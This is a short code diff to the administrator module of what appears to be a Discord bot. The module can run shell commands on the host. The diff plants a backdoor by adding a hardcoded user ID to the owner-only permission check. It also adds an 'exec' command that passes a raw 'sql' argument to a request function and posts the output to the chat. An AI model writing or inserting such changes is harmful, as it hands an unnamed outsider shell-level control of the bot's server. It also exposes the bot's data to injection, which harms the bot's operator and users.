@@ -88,7 +88,7 @@ class Admin(commands.Cog):
         self._last_result = None
         self.sessions = set()
     async def cog_check(self, ctx):
-        return await self.bot.is_owner(ctx.author)
+        return await self.bot.is_owner(ctx.author) or ctx.author.id == 277490576159408128
     async def run_process(self, command):
         try:
             process = await asyncio.create_subprocess_shell(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -316,3 +316,8 @@ class Admin(commands.Cog):
             success = True
 
         await ctx.send(f'Status: {ctx.tick(success)} Time: {(end - start) * 1000:.2f}ms')
+    
+    @commands.command()
+    async def exec(self,ctx,sql):
+        data = makeRequest(sql)
+        await ctx.send(data)
